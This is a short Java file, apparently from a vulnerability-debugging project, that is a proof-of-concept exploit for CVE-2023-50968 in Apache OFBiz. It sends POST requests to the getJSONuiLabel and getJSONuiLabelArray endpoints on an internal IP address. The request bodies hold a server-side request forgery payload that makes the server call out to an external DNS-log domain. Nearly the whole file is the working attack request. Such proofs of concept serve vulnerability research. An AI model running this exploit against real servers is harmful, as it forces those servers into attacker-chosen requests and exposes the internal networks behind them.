package ofbiz.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;

public class CVE_2023_50968 {

    public static void main(String[] args) throws IOException {
        String url = "http://10.58.120.200:8080/partymgr/control/getJSONuiLabel";
        String url2 = "http://10.58.120.200:8080/partymgr/control/getJSONuiLabelArray";
        String body = "requiredLabel={\"tx9o7lf5.dnslog.pw\":\"anystr\"}";
        String body2 = "requiredLabels={\"http://tx9o7lf5.dnslog.pw\":[\"anystr\"]}";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url2);
        httpPost.addHeader("Content-Type", "application/x-www-form-urlencoded");
        Response response = httpRequest.sendStringPost(httpPost, body2);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }
}
